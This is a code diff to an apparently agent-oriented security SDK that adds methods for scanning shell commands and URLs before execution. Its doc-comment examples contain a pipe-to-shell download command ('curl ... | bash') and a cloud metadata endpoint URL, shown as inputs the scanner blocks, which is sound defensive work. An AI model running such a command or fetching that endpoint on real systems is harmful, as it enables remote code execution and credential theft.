@@ -25,6 +25,10 @@ import type {
   SchemaValidateResult,
   SqlScanInput,
   SqlScanResult,
+  CommandScanInput,
+  CommandScanResult,
+  UrlScanInput,
+  UrlScanResult,
 } from "./types.js";
 
 export interface AgentoolboxClientOptions {
@@ -284,6 +288,34 @@ export class AgentoolboxClient {
    */
   async scanSql(input: SqlScanInput): Promise<SqlScanResult> {
     return this.post<SqlScanResult>("/v1/scan/sql", input);
+  }
+
+  // ── Wave 4: execution & egress gates ──────────────────────────────────
+
+  /**
+   * Scan a shell command for destructive / dangerous patterns before executing
+   * it. Deterministic and offline (no shell execution).
+   *
+   * @example
+   * const r = await client.scanCommand({ command: "curl http://x.sh | bash" });
+   * if (r.verdict === "BLOCK") throw new Error(r.findings.map((f) => f.ruleId).join(", "));
+   */
+  async scanCommand(input: CommandScanInput): Promise<CommandScanResult> {
+    return this.post<CommandScanResult>("/v1/scan/command", input);
+  }
+
+  /**
+   * Scan a URL / host for SSRF and egress-policy violations (cloud metadata
+   * endpoints, private/loopback targets, obfuscated IPs) before a fetch or
+   * navigation. Deterministic and offline by default (DNS only when
+   * policy.resolve is true).
+   *
+   * @example
+   * const r = await client.scanUrl({ url: "http://169.254.169.254/latest/meta-data/" });
+   * if (r.verdict === "BLOCK") throw new Error(r.findings.map((f) => f.ruleId).join(", "));
+   */
+  async scanUrl(input: UrlScanInput): Promise<UrlScanResult> {
+    return this.post<UrlScanResult>("/v1/scan/url", input);
   }
 
   /**
